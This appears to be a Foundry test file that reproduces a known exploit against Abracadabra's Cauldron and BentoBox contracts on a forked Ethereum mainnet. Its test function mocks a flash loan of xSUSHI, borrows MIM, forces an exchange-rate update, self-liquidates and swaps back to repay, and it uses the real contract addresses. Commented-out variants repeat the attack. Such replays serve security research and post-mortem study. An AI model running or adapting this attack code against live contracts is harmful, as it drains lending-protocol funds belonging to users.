// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";
import "./QueryBlockchain.sol";

// @Analysis
// https://eigenphi.substack.com/p/casting-a-magic-spell-on-abracadabra
// https://twitter.com/BlockSecTeam/status/1603633067876155393
// @TX
// https://etherscan.io/tx/0x3d163bfbec5686d428a6d43e45e2626a220cc4fcfac7620c620b82c1f2537c78

struct Rebase {
    uint128 elastic;
    uint128 base;
}

interface BentoBoxV1 {
    function batchFlashLoan(
        address borrower,
        address[] calldata receivers,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata data
    ) external;

    function setMasterContractApproval(
        address user,
        address masterContract,
        bool approved,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function deposit(address token_, address from, address to, uint256 amount, uint256 share) external;

    function withdraw(address token_, address from, address to, uint256 amount, uint256 share) external;

    function balanceOf(address token, address account) external returns (uint256);

    function toAmount(
        IERC20 token,
        uint256 share,
        bool roundUp
    ) external view returns (uint256 amount);

    function totals(IERC20) external view returns (Rebase memory totals_);
}

interface CauldronMediumRiskV1 {
    function addCollateral(address to, bool skim, uint256 share) external;

    function borrow(address to, uint256 amount) external;

    function updateExchangeRate() external;

    function liquidate(
        address[] calldata users,
        uint256[] calldata maxBorrowParts,
        address to,
        address swapper
    ) external;

    function totalBorrow() external returns (Rebase memory);
}

contract ContractTest is Test, BlockLoader {
    BentoBoxV1 bentobox = BentoBoxV1(0xF5BCE5077908a1b7370B9ae04AdC565EBd643966);
    CauldronMediumRiskV1 cauldron = CauldronMediumRiskV1(0xbb02A884621FB8F5BFd263A67F58B65df5b090f3);
    IERC20 xSUSHI = IERC20(0x8798249c2E607446EfB7Ad49eC89dD1865Ff4272);
    IERC20 mim = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ISushiSwap router = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);


    address masterContract = 0x4a9Cb5D0B755275Fd188f87c0A8DF531B0C7c7D2;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint256 flashloanAmount;
    uint256 paybackAmount;

    function setUp() public {
        cheats.createSelectFork("mainnet", 15_928_289);
        cheats.label(address(bentobox), "BentoBox");
        cheats.label(address(cauldron), "Cauldron");
        cheats.label(address(xSUSHI), "xSUSHI");
        cheats.label(address(mim), "MIM");
        cheats.label(address(router), "router");

        bentobox.setMasterContractApproval(address(this), masterContract, true, uint8(0), bytes32(0), bytes32(0));
    }

    function print(string memory tips) public {
        emit log_string(tips);
        address attacker = address(this);
        address bentboxAddr = address(bentobox);
        address cauldronAddr = address(cauldron);
        queryERC20BalanceDecimals(address(xSUSHI), attacker, xSUSHI.decimals());
        queryERC20BalanceDecimals(address(mim), attacker, mim.decimals());
        queryERC20BalanceDecimals(address(xSUSHI), bentboxAddr, xSUSHI.decimals());
        queryERC20BalanceDecimals(address(mim), bentboxAddr, mim.decimals());
        queryERC20BalanceDecimals(address(xSUSHI), cauldronAddr, xSUSHI.decimals());
        queryERC20BalanceDecimals(address(mim), cauldronAddr, mim.decimals());
        emit log_string("");

    }

    function testExploit() public {
        uint256 share = 450_000 * 1e18;
        uint256 ret = bentobox.toAmount(xSUSHI, share * 1e18 / 1e5 * 75000, false);
        emit log_named_uint("Compute Rate", ret);

        Rebase memory rebase = cauldron.totalBorrow();
        emit log_named_uint("Cauldron.TotalBorrow.elastic", rebase.elastic);
        emit log_named_uint("Cauldron.TotalBorrow.base", rebase.base);

        Rebase memory xsushi_rebase = bentobox.totals(xSUSHI);
        emit log_named_uint("xSUSHI.Totals.elastic", xsushi_rebase.elastic);
        emit log_named_uint("xSUSHI.Totals.base", xsushi_rebase.base);

        emit log_string("");
        print("Before exploit: ");
        prepareAction();
        exploitAction();
        print("After exploit: ");
        postAction();
        print("After payback: ");
    }

    function prepareAction() internal {
        // Step 1, mock to flashloan xSUSHI.
        flashloanAmount = 450_000 * 1e18;
        paybackAmount = flashloanAmount * 1003 / 1000;
        deal(address(xSUSHI), address(this), 450_000 * 1e18);
    }

    function swap_cauldron_xsushi_mim(uint256 amount) public {
        xSUSHI.approve(address(bentobox), type(uint256).max);
        bentobox.deposit(address(xSUSHI), address(this), address(this), 0, amount);
        cauldron.addCollateral(address(this), false, amount);
        cauldron.borrow(address(this), 800_000 * 1e18);
    }

    function swap_cauldron_mim_xsushi(uint256 amount) public {
        address[] memory users = new address[](1);
        users[0] = address(this);
        uint256[] memory maxBorrowParts = new uint256[](1);
        maxBorrowParts[0] = amount;
        cauldron.liquidate(users, maxBorrowParts, address(this), address(0));
        bentobox.withdraw(
            address(xSUSHI), address(this), address(this), 0, bentobox.balanceOf(address(xSUSHI), address(this))
        );
        bentobox.withdraw(address(mim), address(this), address(this), 0, bentobox.balanceOf(address(mim), address(this)));
    }

    function exploitAction() internal {
        // Step 2, borrow MIM from cauldron
        swap_cauldron_xsushi_mim(420_000 * 1e18);

        print("After swap0: ");

        // Step 3, make discrepancy
        cauldron.updateExchangeRate();

        print("After update: ");

        // Step 4, liquidate the MIM token
        swap_cauldron_mim_xsushi(680_000 * 1e18);

        print("After swap1: ");
    }

    function postAction() internal {
        mim.approve(address(router), type(uint256).max);
        uint256 swapAmount = paybackAmount - xSUSHI.balanceOf(address(this));
        address[] memory path = new address[](3);
        path[0] = address(mim);
        path[1] = address(weth);
        path[2] = address(xSUSHI);
        router.swapTokensForExactTokens(swapAmount, type(uint256).max, path, address(this), block.timestamp);
        xSUSHI.transfer(address(0xdead), paybackAmount);
    }

    // function testExploit() public {
    //     mim.approve(address(router), type(uint256).max);
    //     address[] memory receivers = new address[](2);
    //     receivers[0] = address(this);
    //     receivers[1] = address(this);
    //     address[] memory tokens = new address[](2);
    //     tokens[0] = address(xSUSHI);
    //     tokens[1] = address(mim);
    //     uint256[] memory amounts = new uint256[](2);
    //     amounts[0] = 450_000 * 1e18;
    //     amounts[1] = 0;
    //     bentobox.batchFlashLoan(address(this), receivers, tokens, amounts, new bytes(1));

    //     emit log_named_decimal_uint("[End] Attacker mim balance after exploit", mim.balanceOf(address(this)), 18);
    // }

    // function testExploit(
    //     // address sender,
    //     // IERC20[] calldata tokens,
    //     // uint256[] calldata amounts,
    //     // uint256[] calldata fees,
    //     // bytes calldata data
    // ) public {
    //     mim.approve(address(router), type(uint256).max);
    //     xSUSHI.approve(address(bentobox), type(uint256).max);
    //     bentobox.deposit(address(xSUSHI), address(this), address(this), 0, 420_000 * 1e18);
    //     cauldron.addCollateral(address(this), false, 420_000 * 1e18);
    //     cauldron.borrow(address(this), 800_000 * 1e18);
    //     cauldron.updateExchangeRate();
    //     address[] memory users = new address[](1);
    //     users[0] = address(this);
    //     uint256[] memory maxBorrowParts = new uint256[](1);
    //     maxBorrowParts[0] = 680_000 * 1e18;
    //     cauldron.liquidate(users, maxBorrowParts, address(this), address(0));
    //     bentobox.withdraw(
    //         address(xSUSHI), address(this), address(this), 0, bentobox.balanceOf(address(xSUSHI), address(this))
    //     );
    //     bentobox.withdraw(address(mim), address(this), address(this), 0, bentobox.balanceOf(address(mim), address(this)));
    //     uint256 swapAmount = 450_000 * 1e18 * 10_005 / 10_000 - xSUSHI.balanceOf(address(this));
    //     address[] memory path = new address[](3);
    //     path[0] = address(mim);
    //     path[1] = address(WETH);
    //     path[2] = address(xSUSHI);
    //     router.swapTokensForExactTokens(swapAmount, type(uint256).max, path, address(this), block.timestamp);
    //     xSUSHI.transfer(address(bentobox), 450_225 * 1e18);
    // }
}
